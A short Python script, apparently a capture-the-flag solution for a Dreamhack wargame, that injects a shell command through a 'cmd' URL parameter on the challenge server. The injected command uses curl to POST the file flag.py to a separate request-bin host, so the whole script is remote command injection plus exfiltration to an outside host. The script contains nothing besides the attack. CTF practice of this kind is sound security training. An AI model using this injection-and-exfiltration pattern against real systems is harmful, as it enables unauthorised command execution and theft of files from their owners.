import requests

url = 'http://host1.dreamhack.games:22022/?cmd='
cmd = 'curl -X POST -d @flag.py https://mnhjber.request.dreamhack.games'
c = requests.head(url+cmd)

print(c.headers)